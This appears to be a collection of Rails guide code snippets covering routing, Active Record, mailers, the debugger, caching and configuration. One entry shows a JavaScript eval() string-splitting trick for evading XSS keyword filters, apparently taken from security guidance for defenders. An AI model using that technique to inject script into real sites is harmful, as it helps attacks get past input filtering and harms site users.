TITLE: Making Ajax Requests with Rails Request.JS
DESCRIPTION: Demonstrates how to use the FetchRequest class from Rails Request.JS to make a POST request with proper CSRF token handling. The example shows importing the class, creating a request with a JSON body, and handling the response.

LANGUAGE: javascript
CODE:
import { FetchRequest } from '@rails/request.js'

....

async myMethod () {
  const request = new FetchRequest('post', 'localhost:3000/posts', {
    body: JSON.stringify({ name: 'Request.JS' })
  })
  const response = await request.perform()
  if (response.ok) {
    const body = await response.text
  }
}

----------------------------------------

TITLE: Catching Exceptions in Rails Debugger with catch Command
DESCRIPTION: This snippet demonstrates how to use the 'catch' command to stop execution when a specific exception class is raised, helping to debug error conditions.

LANGUAGE: ruby
CODE:
[20, 29] in ~/projects/rails-guide-example/app/controllers/posts_controller.rb
    20|   end
    21|
    22|   # POST /posts or /posts.json
    23|   def create
    24|     @post = Post.new(post_params)
=>  25|     debugger
    26|
    27|     respond_to do |format|
    28|       if @post.save!
    29|         format.html { redirect_to @post, notice: "Post was successfully created." }
=>#0    PostsController#create at ~/projects/rails-guide-example/app/controllers/posts_controller.rb:25
  #1    ActionController::BasicImplicitRender#send_action(method="create", args=[]) at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/actionpack-7.0.0.alpha2/lib/action_controller/metal/basic_implicit_render.rb:6
  # and 72 frames (use `bt' command for all frames)
(rdbg) catch ActiveRecord::RecordInvalid    # command
#1  BP - Catch  "ActiveRecord::RecordInvalid"

LANGUAGE: ruby
CODE:
(rdbg) c    # continue command
[75, 84] in ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/activerecord-7.0.0.alpha2/lib/active_record/validations.rb
    75|     def default_validation_context
    76|       new_record? ? :create : :update
    77|     end
    78|
    79|     def raise_validation_error
=>  80|       raise(RecordInvalid.new(self))
    81|     end
    82|
    83|     def perform_validations(options = {})
    84|       options[:validate] == false || valid?(options[:context])
=>#0    ActiveRecord::Validations#raise_validation_error at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/activerecord-7.0.0.alpha2/lib/active_record/validations.rb:80
  #1    ActiveRecord::Validations#save!(options={}) at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/activerecord-7.0.0.alpha2/lib/active_record/validations.rb:53
  # and 88 frames (use `bt' command for all frames)

Stop by #1  BP - Catch  "ActiveRecord::RecordInvalid"

----------------------------------------

TITLE: Creating an Article in Rails Console
DESCRIPTION: Ruby code for creating a new Article record with a body attribute, typically used in the Rails console for testing or seeding data.

LANGUAGE: ruby
CODE:
Article.create(body: "Partial Layouts are cool!")

----------------------------------------

TITLE: Using preload_link_tag Helper in Rails
DESCRIPTION: Example of using preload_link_tag to generate a link tag with rel="preload" for browser resource preloading, improving page load performance.

LANGUAGE: ruby
CODE:
preload_link_tag("application.css")
# => <link rel="preload" href="/assets/application.css" as="style" type="text/css" />

----------------------------------------

TITLE: Using before_action Callbacks in Action Mailer
DESCRIPTION: Example of using before_action callbacks in a mailer to set instance variables and configure default email settings. This demonstrates both symbol and block syntax for callbacks.

LANGUAGE: ruby
CODE:
class InvitationsMailer < ApplicationMailer
  before_action :set_inviter_and_invitee
  before_action { @account = params[:inviter].account }

  default to:       -> { @invitee.email_address },
          from:     -> { common_address(@inviter) },
          reply_to: -> { @inviter.email_address_with_name }

  def account_invitation
    mail subject: "#{@inviter.name} invited you to their Basecamp (#{@account.name})"
  end

  def project_invitation
    @project    = params[:project]
    @summarizer = ProjectInvitationSummarizer.new(@project.bucket)

    mail subject: "#{@inviter.name.familiar} added you to a project in Basecamp (#{@account.name})"
  end

  private
    def set_inviter_and_invitee
      @inviter = params[:inviter]
      @invitee = params[:invitee]
    end
end

----------------------------------------

TITLE: Incorrect Glob Configuration for Autoload Paths
DESCRIPTION: Shows an incorrect pattern using wildcards in autoload_paths configuration. This creates issues because each element of autoload_paths should represent the top-level namespace and cannot be nested.

LANGUAGE: ruby
CODE:
config.autoload_paths += Dir["#{config.root}/lib/**/"]

----------------------------------------

TITLE: Implementing Basic HTTP Authentication in Controllers
DESCRIPTION: Comparison of the old verbose way of implementing HTTP Basic Authentication in a controller versus the new simplified class method approach introduced in Rails 3.1.

LANGUAGE: ruby
CODE:
class PostsController < ApplicationController
  USER_NAME, PASSWORD = "dhh", "secret"

  before_filter :authenticate, :except => [ :index ]

  def index
    render :text => "Everyone can see me!"
  end

  def edit
    render :text => "I'm only accessible if you know the password"
  end

  private
    def authenticate
      authenticate_or_request_with_http_basic do |user_name, password|
        user_name == USER_NAME && password == PASSWORD
      end
    end
end

LANGUAGE: ruby
CODE:
class PostsController < ApplicationController
  http_basic_authenticate_with :name => "dhh", :password => "secret", :except => :index

  def index
    render :text => "Everyone can see me!"
  end

  def edit
    render :text => "I'm only accessible if you know the password"
  end
end

----------------------------------------

TITLE: Specifying HABTM Join Tables with Common Prefixes in Rails 4.0
DESCRIPTION: Rails 4.0 changed the default join table naming for has_and_belongs_to_many relations when models share a common prefix. This example demonstrates how to explicitly set the join_table option to maintain compatibility with existing tables.

LANGUAGE: ruby
CODE:
class CatalogCategory < ActiveRecord::Base
  has_and_belongs_to_many :catalog_products, join_table: "catalog_categories_catalog_products"
end

class CatalogProduct < ActiveRecord::Base
  has_and_belongs_to_many :catalog_categories, join_table: "catalog_categories_catalog_products"
end

----------------------------------------

TITLE: Alternative Order of DateTime Advance Operations in Ruby
DESCRIPTION: This example shows how changing the order of advance operations on a DateTime object produces different results due to the order of execution.

LANGUAGE: ruby
CODE:
d.advance(seconds: 1).advance(months: 1)
# => Thu, 01 Apr 2010 00:00:00 +0000

----------------------------------------

TITLE: English Currency Format with Interpolation in YAML
DESCRIPTION: YAML configuration for the English locale defining the product price format with the dollar sign before the price. Uses proper variable interpolation.

LANGUAGE: yaml
CODE:
# config/locales/en.yml
en:
  product_price: "$%{price}"

----------------------------------------

TITLE: Generating a New Mailbox in Rails
DESCRIPTION: Command to generate a new mailbox class for processing emails. This creates a 'forwards_mailbox.rb' file with a ForwardsMailbox class and a process method.

LANGUAGE: bash
CODE:
# Generate new mailbox
$ bin/rails generate mailbox forwards

----------------------------------------

TITLE: Implementing Page Fragment Caching in Rails
DESCRIPTION: Demonstrates how to cache a specific part of a page using Rails' cache helper. The product name is cached using the product object to generate a unique cache key.

LANGUAGE: erb
CODE:
<% cache @product do %>
  <h1><%= @product.name %></h1>
<% end %>

----------------------------------------

TITLE: Installing Migrations from Custom Path
DESCRIPTION: Command to copy migrations from a specific path in the source engine.

LANGUAGE: bash
CODE:
$ bin/rails railties:install:migrations MIGRATIONS_PATH=db_blourgh

----------------------------------------

TITLE: Configuring Rails Host Authorization for Development
DESCRIPTION: Shows the default host authorization configuration for Rails development environment. This protects against DNS rebinding and Host header attacks by specifying allowed hosts.

LANGUAGE: ruby
CODE:
Rails.application.config.hosts = [
  IPAddr.new("0.0.0.0/0"),        # All IPv4 addresses.
  IPAddr.new("::/0"),             # All IPv6 addresses.
  "localhost",                    # The localhost reserved domain.
  ENV["RAILS_DEVELOPMENT_HOSTS"]  # Additional comma-separated hosts for development.
]

----------------------------------------

TITLE: Creating a Custom Logger with TaggedLogging Support in Rails
DESCRIPTION: Example of implementing a custom logger class compatible with Rails' logging system. This implementation includes LoggerSilence module support and properly applies the configured formatter to maintain full compatibility.

LANGUAGE: ruby
CODE:
class MyLogger < ::Logger
  include ActiveSupport::LoggerSilence
end

mylogger           = MyLogger.new(STDOUT)
mylogger.formatter = config.log_formatter
config.logger      = ActiveSupport::TaggedLogging.new(mylogger)

----------------------------------------

TITLE: Configuring Test Environment for Static Assets
DESCRIPTION: Configuration for the test environment in Rails 3.1 to properly serve static assets with appropriate cache control headers for performance testing.

LANGUAGE: ruby
CODE:
# Configure static asset server for tests with Cache-Control for performance
config.serve_static_assets = true
config.static_cache_control = "public, max-age=3600"

----------------------------------------

TITLE: Enabling SQL Query Comments in Rails Application
DESCRIPTION: Shows how to enable SQL query comments that add tags with runtime information to SQL statements, helping trace queries back to their source in the application.

LANGUAGE: ruby
CODE:
config.active_record.query_log_tags_enabled = true

----------------------------------------

TITLE: Using to_yaml Method with simple_format Helper in Rails Views
DESCRIPTION: Shows how to convert an object to YAML representation and format it using the simple_format helper to create readable output in a Rails view.

LANGUAGE: erb
CODE:
<%= simple_format @article.to_yaml %>
<p>
  <b>Title:</b>
  <%= @article.title %>
</p>

----------------------------------------

TITLE: Running Rails Tests on Specific Lines
DESCRIPTION: Shows how to run a test at a specific line by providing the line number to the test command. This allows targeting a specific test within a file.

LANGUAGE: bash
CODE:
$ bin/rails test test/models/article_test.rb:6 # run specific test and line

----------------------------------------

TITLE: Configuring Queue Name Delimiter in Application Configuration
DESCRIPTION: Example of changing the queue name delimiter in application.rb. This allows customizing how the prefix and queue name are joined together.

LANGUAGE: ruby
CODE:
# config/application.rb
module YourApp
  class Application < Rails::Application
    config.active_job.queue_name_prefix = Rails.env
    config.active_job.queue_name_delimiter = "."
  end
end

----------------------------------------

TITLE: Base Module Definition for an Engine
DESCRIPTION: The main module file that defines the base namespace for the engine and requires the engine initialization file.

LANGUAGE: ruby
CODE:
require "blorgh/engine"

module Blorgh
end

----------------------------------------

TITLE: Rendering Inline Turbo Stream Responses
DESCRIPTION: Ruby code demonstrating how to render Turbo Stream responses inline in a controller action. This example shows prepending a post partial to a container.

LANGUAGE: ruby
CODE:
def create
  @post = Post.new(post_params)

  respond_to do |format|
    if @post.save
      format.turbo_stream { render turbo_stream: turbo_stream.prepend("posts", partial: "post") }
    else
      format.html { render :new, status: :unprocessable_entity }
    end
  end
end

----------------------------------------

TITLE: Generating Test Models in Dummy Application
DESCRIPTION: Rails commands to create test models in the dummy application for plugin testing. This demonstrates how to set up test fixtures for integration testing.

LANGUAGE: bash
CODE:
$ cd test/dummy
$ bin/rails generate model Hickwall last_squawk:string
$ bin/rails generate model Wickwall last_squawk:string last_tweet:string

----------------------------------------

TITLE: Implementing Nested Transactions in Active Record in Ruby on Rails
DESCRIPTION: This code demonstrates how to use nested transactions in Active Record, allowing you to roll back an inner transaction without affecting the state of the outer transaction using the :requires_new option.

LANGUAGE: ruby
CODE:
User.transaction do
  User.create(:username => 'Admin')
  User.transaction(:requires_new => true) do
    User.create(:username => 'Regular')
    raise ActiveRecord::Rollback
  end
end

User.find(:all)  # => Returns only Admin

----------------------------------------

TITLE: Splatting Options with Pattern Matching in Rails Partials
DESCRIPTION: Demonstrates how to extract a primary parameter and splat additional options into helper method calls using Ruby's pattern matching with local_assigns.

LANGUAGE: html+erb
CODE:
<%# app/views/products/_product.html.erb %>

<% local_assigns => { product:, **options } %>

<%= tag.div id: dom_id(product), **options do %>
  <h1><%= product.name %></h1>
<% end %>

<%# app/views/products/show.html.erb %>

<%= render "products/product", product: @product, class: "card" %>
<%# => <div id="product_1" class="card">
  #      <h1>A widget</h1>
  #    </div>
%>

----------------------------------------

TITLE: Creating Associated Records with Explicit Composite Foreign Keys
DESCRIPTION: Shows how to create an Author with a composite primary key and an associated Book with explicit foreign key columns.

LANGUAGE: ruby
CODE:
author = Author.create!(first_name: "Jane", last_name: "Doe")
book = author.books.create!(title: "A Cool Book", author_first_name: "Jane", author_last_name: "Doe")

----------------------------------------

TITLE: Using Dynamic Scopes in Active Record Models in Ruby on Rails
DESCRIPTION: This snippet demonstrates dynamic scope methods in Rails, which allow filtering on the fly and method chaining without explicit definitions, combining the flexibility of dynamic finders with named scopes.

LANGUAGE: ruby
CODE:
Order.scoped_by_customer_id(12)
Order.scoped_by_customer_id(12).find(:all,
  :conditions => "status = 'open'")
Order.scoped_by_customer_id(12).scoped_by_status("open")

----------------------------------------

TITLE: Organizing Class Responsibilities with Module#concerning
DESCRIPTION: A method for organizing related methods within a class to improve code organization and separation of responsibilities.

LANGUAGE: ruby
CODE:
Module#concerning

----------------------------------------

TITLE: Incorrect Engine Configuration for Reloadable User Model
DESCRIPTION: This approach to configuring an engine with a reference to a reloadable User class will fail with a NameError because the class cannot be referenced in an initializer.

LANGUAGE: ruby
CODE:
# config/initializers/my_engine.rb
MyEngine.configure do |config|
  config.user_model = User # NameError
end

----------------------------------------

TITLE: Form Creation with Custom PUT Route
DESCRIPTION: Example of using form_for with a custom route that uses PUT. In Rails 4, this will attempt to use a non-existent PATCH route by default.

LANGUAGE: erb
CODE:
<%= form_for [ :update_name, @user ] do |f| %>

----------------------------------------

TITLE: Creating a Join Table with Custom Name
DESCRIPTION: Migration that creates a join table with a custom table name instead of the default naming convention of combining model names.

LANGUAGE: ruby
CODE:
create_join_table :products, :categories, table_name: :categorization

----------------------------------------

TITLE: Creating Permanent Cookies in Rails
DESCRIPTION: Shows how to create a cookie that will persist for 20 years using the permanent cookie jar. This is useful for long-term user preferences like locale settings.

LANGUAGE: ruby
CODE:
cookies.permanent[:locale] = "fr"

----------------------------------------

TITLE: Enabling Caching for Action Mailer
DESCRIPTION: Configuration to enable fragment caching in Action Mailer views by setting perform_caching to true in the application's environment configuration file.

LANGUAGE: ruby
CODE:
config.action_mailer.perform_caching = true

----------------------------------------

TITLE: Viewing a Saved Product Instance in Rails
DESCRIPTION: Example output showing a Product instance after being saved to the database. Notice that the id, created_at, and updated_at fields are now populated.

LANGUAGE: irb
CODE:
store(dev)> product
=> #<Product:0x00000001221f6260 id: 1, name: "T-Shirt", created_at: "2024-11-09 16:35:01.117836000 +0000", updated_at: "2024-11-09 16:35:01.117836000 +0000">

----------------------------------------

TITLE: Unified Rendering in Rails Controllers (New Style)
DESCRIPTION: Demonstrates the simplified rendering syntax introduced in Rails 2.3 where Rails automatically determines the render type based on the string format.

LANGUAGE: ruby
CODE:
render '/tmp/random_file.erb'
render 'other_controller/action'
render 'show'
render :show

----------------------------------------

TITLE: Rails::Server Inheritance from Rack::Server
DESCRIPTION: Shows how the Rails::Server class inherits from Rack::Server and calls the parent's start method. This demonstrates the inheritance relationship between Rails' server implementation and Rack's server.

LANGUAGE: ruby
CODE:
class Server < ::Rack::Server
  def start
    # ...
    super
  end
end

----------------------------------------

TITLE: Password Reset Email Template
DESCRIPTION: HTML template for the password reset email generated by the authentication generator. This is sent to users who request a password reset, with a time-limited reset link.

LANGUAGE: html+erb
CODE:
# app/views/passwords_mailer/reset.html.erb
<p>
  You can reset your password within the next 15 minutes on
  <%= link_to "this password reset page", edit_password_url(@user.password_reset_token) %>.
</p>

----------------------------------------

TITLE: Using Template Dependency Wildcards in ERB Templates
DESCRIPTION: Rails 5 adds support for wildcard matching in template dependencies, allowing you to specify a pattern for multiple template dependencies rather than listing each one separately.

LANGUAGE: erb
CODE:
<% # Template Dependency: recordings/threads/events/* %>

----------------------------------------

TITLE: Formatting CHANGELOG Entries for Rails
DESCRIPTION: Shows the recommended format for CHANGELOG entries in the Rails project. Includes guidance on formatting, code examples, and attributing changes to authors.

LANGUAGE: markdown
CODE:
*   Summary of a change that briefly describes what was changed. You can use multiple
    lines and wrap them at around 80 characters. Code examples are ok, too, if needed:

        class Foo
          def bar
            puts 'baz'
          end
        end

    You can continue after the code example, and you can attach the issue number.

    Fixes #1234.

    *Your Name*

----------------------------------------

TITLE: Generating Database-Specific Migrations with Rails CLI
DESCRIPTION: Creating a migration for a specific database using the Rails generator CLI with the --database option to place the migration in the correct directory.

LANGUAGE: bash
CODE:
$ bin/rails generate migration CreateDogs name:string --database animals

----------------------------------------

TITLE: Defining Routes with Default Parameters in Rails
DESCRIPTION: Creates a route with default parameter values using the :defaults option. These defaults will be used when the parameter is not provided in the URL.

LANGUAGE: ruby
CODE:
get "photos/:id", to: "photos#show", defaults: { format: "jpg" }

----------------------------------------

TITLE: Defining Models with Associations in Different Modules
DESCRIPTION: Shows how associations don't work by default when models are defined in different module scopes.

LANGUAGE: ruby
CODE:
module MyApplication
  module Business
    class Supplier < ApplicationRecord
      has_one :account
    end
  end

  module Billing
    class Account < ApplicationRecord
      belongs_to :supplier
    end
  end
end

----------------------------------------

TITLE: Error Handling when Running a Non-existent Migration Version
DESCRIPTION: This shows the error message when trying to run a migration with a version number that doesn't exist in the application.

LANGUAGE: bash
CODE:
$ bin/rails db:migrate VERSION=00000000000000
rails aborted!
ActiveRecord::UnknownMigrationVersionError:

No migration with version number 00000000000000.

----------------------------------------

TITLE: Bulk Enqueuing Jobs with perform_all_later in Rails
DESCRIPTION: Shows how to enqueue multiple jobs at once using perform_all_later to reduce database round trips and improve performance when scheduling multiple jobs.

LANGUAGE: ruby
CODE:
# Create jobs to pass to `perform_all_later`.
# The arguments to `new` are passed on to `perform`
guest_cleanup_jobs = Guest.all.map { |guest| GuestsCleanupJob.new(guest) }

# Will enqueue a separate job for each instance of `GuestCleanupJob`
ActiveJob.perform_all_later(guest_cleanup_jobs)

# Can also use `set` method to configure options before bulk enqueuing jobs.
guest_cleanup_jobs = Guest.all.map { |guest| GuestsCleanupJob.new(guest).set(wait: 1.day) }

ActiveJob.perform_all_later(guest_cleanup_jobs)

----------------------------------------

TITLE: Configuring Test Models with Acts As Yaffle
DESCRIPTION: Example of how to update the test models to use the acts_as_yaffle method. This shows how to configure a model with default and custom settings.

LANGUAGE: ruby
CODE:
# test/dummy/app/models/hickwall.rb

class Hickwall < ApplicationRecord
  acts_as_yaffle
end

----------------------------------------

TITLE: Enabling Strict Loading on Associations in Rails Models
DESCRIPTION: This snippet shows how to enable strict loading for a specific association by adding the strict_loading option to the association definition in the model.

LANGUAGE: ruby
CODE:
class Author < ApplicationRecord
  has_many :books, strict_loading: true
end

----------------------------------------

TITLE: Creating Select Box from City Collection in Rails ERB
DESCRIPTION: This snippet demonstrates how to create a select box with options generated from a collection of City objects. It manually maps each city to an array with name and ID.

LANGUAGE: erb
CODE:
<%= form_with model: @person do |form| %>
  <%= form.select :city_id, City.order(:name).map { |city| [city.name, city.id] } %>
<% end %>

----------------------------------------

TITLE: Dynamic Redirection with Path Parameters in Rails Routes
DESCRIPTION: Shows how to use dynamic segments from the original URL in the redirect target using string interpolation with %{name} syntax. This preserves the parameter when redirecting.

LANGUAGE: ruby
CODE:
get "/stories/:name", to: redirect("/articles/%{name}")

----------------------------------------

TITLE: Using JavaScript eval() for String Concatenation to Bypass Filters
DESCRIPTION: JavaScript technique that uses eval() with string concatenation to bypass filters that block specific keywords like 'innerHTML'.

LANGUAGE: js
CODE:
alert(eval('document.body.inne' + 'rHTML'));

----------------------------------------

TITLE: Configuring Browser Version Guard with Specific Browser Versions
DESCRIPTION: Example of configuring browser version guard with specific version requirements for different browsers, allowing all Chrome and Opera versions while blocking Internet Explorer completely.

LANGUAGE: ruby
CODE:
class ApplicationController < ActionController::Base
  # All versions of Chrome and Opera will be allowed, but no versions of "internet explorer" (ie). Safari needs to be 16.4+ and Firefox 121+.
  allow_browser versions: { safari: 16.4, firefox: 121, ie: false }
end

----------------------------------------

TITLE: Converting Arrays to XML in Ruby on Rails
DESCRIPTION: Demonstrates how to convert arrays of various types to XML using the to_xml method from Active Support. The example shows the structure of the resulting XML document and default node naming conventions.

LANGUAGE: ruby
CODE:
[{ a: 1, b: 2 }, { c: 3 }].to_xml
# =>
# <?xml version="1.0" encoding="UTF-8"?>
# <objects type="array">
#   <object>
#     <b type="integer">2</b>
#     <a type="integer">1</a>
#   </object>
#   <object>
#     <c type="integer">3</c>
#   </object>
# </objects>

----------------------------------------

TITLE: Configuring Error Handling in Transaction Callbacks in Ruby on Rails
DESCRIPTION: Configuration to enable error propagation in after_rollback or after_commit callbacks instead of the default error suppression in Rails 4.2. This setting should be added to the application.rb file.

LANGUAGE: ruby
CODE:
config.active_record.raise_in_transactional_callbacks = true

----------------------------------------

TITLE: Configuring Case-Insensitive Confirmation Validation
DESCRIPTION: Example showing how to make confirmation validation case-insensitive by setting the case_sensitive option to false.

LANGUAGE: ruby
CODE:
class Person < ApplicationRecord
  validates :email, confirmation: { case_sensitive: false }
end

----------------------------------------

TITLE: Using Integer#ordinal in Ruby on Rails
DESCRIPTION: This method returns the ordinal suffix string (st, nd, rd, th) corresponding to the integer value. It handles both positive and negative integers.

LANGUAGE: ruby
CODE:
1.ordinal    # => "st"
2.ordinal    # => "nd"
53.ordinal   # => "rd"
2009.ordinal # => "th"
-21.ordinal  # => "st"
-134.ordinal # => "th"

----------------------------------------

TITLE: Using p and pp Commands in Rails Debugger
DESCRIPTION: Example demonstrating the use of p and pp commands to evaluate Ruby expressions in the debugger, particularly useful when variable names conflict with debugger commands.

LANGUAGE: ruby
CODE:
(rdbg) p headers    # command
=> {"X-Frame-Options"=>"SAMEORIGIN", "X-XSS-Protection"=>"1; mode=block", "X-Content-Type-Options"=>"nosniff", "X-Download-Options"=>"noopen", "X-Permitted-Cross-Domain-Policies"=>"none", "Referrer-Policy"=>"strict-origin-when-cross-origin"}
(rdbg) pp headers    # command
{"X-Frame-Options"=>"SAMEORIGIN",
 "X-XSS-Protection"=>"1; mode=block",
 "X-Content-Type-Options"=>"nosniff",
 "X-Download-Options"=>"noopen",
 "X-Permitted-Cross-Domain-Policies"=>"none",
 "Referrer-Policy"=>"strict-origin-when-cross-origin"}
(rdbg)

----------------------------------------

TITLE: Custom Schema Versions Formatter Implementation in Ruby
DESCRIPTION: Example of creating a custom schema versions formatter to control how schema migration versions are formatted in SQL dumps. This implementation provides special sorting of versions to reduce conflict likelihood.

LANGUAGE: ruby
CODE:
class CustomSchemaVersionsFormatter
  def initialize(connection)
    @connection = connection
  end

  def format(versions)
    # Special sorting of versions to reduce the likelihood of conflicts.
    sorted_versions = versions.sort { |a, b| b.to_s.reverse <=> a.to_s.reverse }

    sql = +"INSERT INTO schema_migrations (version) VALUES\n"
    sql << sorted_versions.map { |v| "(#{@connection.quote(v)})" }.join(",\n")
    sql << ";"
    sql
  end
end

config.active_record.schema_versions_formatter = CustomSchemaVersionsFormatter

----------------------------------------

TITLE: Accessing Counter Variables in Rails Collection Partials
DESCRIPTION: Demonstrates how to use the automatically generated counter variable when rendering collections, which tracks the number of times a partial has been rendered.

LANGUAGE: erb
CODE:
<%# index.html.erb %>
<%= render partial: "product", collection: @products %>

LANGUAGE: erb
CODE:
<%# _product.html.erb %>
<%= product_counter %> # 0 for the first product, 1 for the second product...

----------------------------------------

TITLE: Namespaced Root Routes in Rails
DESCRIPTION: Shows how to define root routes within namespaces or scopes. This allows setting different root actions for the main application and its namespaced sections.

LANGUAGE: ruby
CODE:
root to: "home#index"

namespace :admin do
  root to: "admin#index"
end

----------------------------------------

TITLE: Creating a Rails Application with Edge Version
DESCRIPTION: Command line instructions for creating a Rails application using the edge (Git repository) version of Rails.

LANGUAGE: bash
CODE:
$ rails new myapp --edge

----------------------------------------

TITLE: Configuring ActiveJob Queue Adapter in Rails
DESCRIPTION: Sets the adapter for the ActiveJob queuing backend. This example configures Sidekiq as the queue adapter. The adapter gem must be included in the Gemfile and its installation and deployment instructions should be followed.

LANGUAGE: ruby
CODE:
# Be sure to have the adapter's gem in your Gemfile
# and follow the adapter's specific installation
# and deployment instructions.
config.active_job.queue_adapter = :sidekiq

----------------------------------------

TITLE: Defining Explicit Methods for Rails Callbacks
DESCRIPTION: Example of defining an explicit method for a callback instead of using an inline block with return. This is the recommended approach when return is needed.

LANGUAGE: ruby
CODE:
class ReadOnlyModel < ActiveRecord::Base
  before_save :before_save_callback # GOOD

  private
    def before_save_callback
      false
    end
end

----------------------------------------

TITLE: Using SQL Fragments with find_by in Ruby on Rails
DESCRIPTION: Shows an example of using find_by with SQL fragments, which doesn't benefit from Adequate Record's prepared statement caching.

LANGUAGE: ruby
CODE:
Post.find_by('published_at < ?', 2.weeks.ago)

----------------------------------------

TITLE: Resetting an Associated Object Cache with belongs_to in Ruby on Rails
DESCRIPTION: Code example showing how to reset the cached association. This causes the next access to query the associated object from the database.

LANGUAGE: ruby
CODE:
@book.reset_author

----------------------------------------

TITLE: Overwriting Where Conditions with rewhere in Rails
DESCRIPTION: A new query method that overwrites an existing, named where condition in an ActiveRecord relation chain.

LANGUAGE: ruby
CODE:
ActiveRecord::QueryMethods#rewhere

----------------------------------------

TITLE: Per-transaction Callback Registration
DESCRIPTION: Example showing how to register callbacks specifically for a transaction using the transaction object. This is useful when the action isn't tied to a specific model but to a unit of work.

LANGUAGE: ruby
CODE:
Article.transaction do |transaction|
  article.update(published: true)

  transaction.after_commit do
    PublishNotificationMailer.with(article: article).deliver_later
  end
end

----------------------------------------

TITLE: Using to_model in ActiveModel::Conversion in IRB
DESCRIPTION: This IRB session demonstrates the to_model method from ActiveModel::Conversion. It shows that to_model returns the object itself by default. If custom behavior is needed, the method can be overridden to return a proxy object.

LANGUAGE: ruby
CODE:
irb> person = Person.new(1)
irb> person.to_model == person
=> true

----------------------------------------

TITLE: Basic to_param Usage in Ruby on Rails
DESCRIPTION: Demonstrates the default behavior of to_param method which calls to_s on objects, and how it is used to represent objects in URL fragments or query strings.

LANGUAGE: ruby
CODE:
7.to_param # => "7"

----------------------------------------

TITLE: Required Local Variables in Rails Partials
DESCRIPTION: Demonstrates how to make local variables required when using strict locals in partials, causing an exception if the required local is not provided.

LANGUAGE: html+erb
CODE:
<%# app/views/messages/_message.html.erb %>

<%# locals: (message:) -%>
<%= message %>

LANGUAGE: ruby
CODE:
render "messages/message"
# => ActionView::Template::Error: missing local: :message for app/views/messages/_message.html.erb

----------------------------------------

TITLE: Engine Model Using ActiveSupport::Concern
DESCRIPTION: Shows how an engine model is structured to include a concern, enabling easier extension or overriding by the host application.

LANGUAGE: ruby
CODE:
# Blorgh/app/models/blorgh/article.rb
module Blorgh
  class Article < ApplicationRecord
    include Blorgh::Concerns::Models::Article
  end
end

----------------------------------------

TITLE: Adding Middlewares to Rails Application Configuration
DESCRIPTION: Shows how to add new middlewares to a Rails application using various configuration methods. The example demonstrates adding middleware at the bottom of the stack and after a specific middleware.

LANGUAGE: ruby
CODE:
# config/application.rb

# Push Rack::BounceFavicon at the bottom
config.middleware.use Rack::BounceFavicon

# Add Lifo::Cache after ActionDispatch::Executor.
# Pass { page_cache: false } argument to Lifo::Cache.
config.middleware.insert_after ActionDispatch::Executor, Lifo::Cache, page_cache: false

----------------------------------------

TITLE: Active Storage Assignment Behavior in Rails 6.0
DESCRIPTION: Shows the changed behavior in Rails 6.0 where assigning to a collection of attachments replaces existing files instead of appending. This aligns with Active Record's behavior when assigning to collection associations.

LANGUAGE: ruby
CODE:
user.highlights.attach(filename: "funky.jpg")
user.highlights.count # => 1

blob = ActiveStorage::Blob.create_after_upload!(filename: "town.jpg")
user.update!(highlights: [ blob ])

user.highlights.count # => 1
user.highlights.first.filename # => "town.jpg"

----------------------------------------

TITLE: Enabling HTTP Streaming in Controllers
DESCRIPTION: Example of how to enable HTTP streaming in a controller using the new stream method introduced in Rails 3.1, which can be applied to all or specific actions.

LANGUAGE: ruby
CODE:
class PostsController < ActionController::Base
  stream
end

----------------------------------------

TITLE: Implementing a Logging Callback for Email Changes in ActiveRecord
DESCRIPTION: Creates a before_save callback that logs changes to a user's email address. The callback uses the email_changed? method to detect changes and logs both the previous and new values.

LANGUAGE: ruby
CODE:
class User < ApplicationRecord
  before_save :log_email_change

  private
    def log_email_change
      if email_changed?
        Rails.logger.info("Email changed from #{email_was} to #{email}")
      end
    end
end

----------------------------------------

TITLE: Implicitly Autoloading Lib via Eager Load Configuration in Ruby
DESCRIPTION: Configuration to add the lib directory to eager load paths, which implicitly adds it to autoload paths as well. This is equivalent to explicitly setting both paths.

LANGUAGE: ruby
CODE:
# Same, because all eager load paths become autoload paths too.
config.eager_load_paths << config.root.join("lib")

----------------------------------------

TITLE: Accessing Route Helpers in Rails Console
DESCRIPTION: Demonstrates how to access route helpers within the Rails console using Rails.application.routes.url_helpers and the app object. The examples show generating paths for resource routes.

LANGUAGE: irb
CODE:
irb> Rails.application.routes.url_helpers.users_path
=> "/users"

irb> user = User.first
=> #<User:0x00007fc1eab81628
irb> app.edit_user_path(user)
=> "/users/1/edit"

----------------------------------------

TITLE: Configuring Recurring Tasks in YAML
DESCRIPTION: Example of a recurring.yml configuration file that defines scheduled tasks. It shows how to configure different types of recurring jobs with custom schedules and parameters.

LANGUAGE: yaml
CODE:
production:
  a_periodic_job:
    class: MyJob
    args: [42, { status: "custom_status" }]
    schedule: every second
  a_cleanup_task:
    command: "DeletedStuff.clear_all"
    schedule: every day at 9am

----------------------------------------

TITLE: Configuring MySQL/MariaDB Database in Rails
DESCRIPTION: This configuration shows the setup for a MySQL or MariaDB database in the development environment. It specifies adapter, encoding, database name, connection pool, credentials, and socket path.

LANGUAGE: yaml
CODE:
development:
  adapter: mysql2
  encoding: utf8mb4
  database: blog_development
  pool: 5
  username: root
  password:
  socket: /tmp/mysql.sock

----------------------------------------

TITLE: Using http_cache_forever for Permanent Caching in Rails Controller
DESCRIPTION: Implements permanent HTTP caching for static content using the http_cache_forever helper. This sets far-future expiration headers so browsers and proxies will cache the response indefinitely.

LANGUAGE: ruby
CODE:
class HomeController < ApplicationController
  def index
    http_cache_forever(public: true) do
      render
    end
  end
end

----------------------------------------

TITLE: Word Truncation with Regexp Separator in Ruby
DESCRIPTION: Shows using a regular expression as a separator for word truncation to find dynamic break points.

LANGUAGE: ruby
CODE:
"Oh dear! Oh dear! I shall be late!".truncate_words(4, separator: /\s/)
# => "Oh dear! Oh dear!..."

----------------------------------------

TITLE: Using ActiveModel::Name for Custom Model Names in Rails
DESCRIPTION: Demonstrates creating and using a custom ActiveModel::Name instance to override model naming behavior. Shows attribute access for naming conventions.

LANGUAGE: irb
CODE:
irb> name = ActiveModel::Name.new(Person::Profile, nil, "Profile")
=> #<ActiveModel::Name:0x000000014c5dbae0

irb> name.singular
=> "profile"
irb> name.singular_route_key
=> "profile"
irb> name.route_key
=> "profiles"

----------------------------------------

TITLE: Creating a Join Table with Custom Column Options
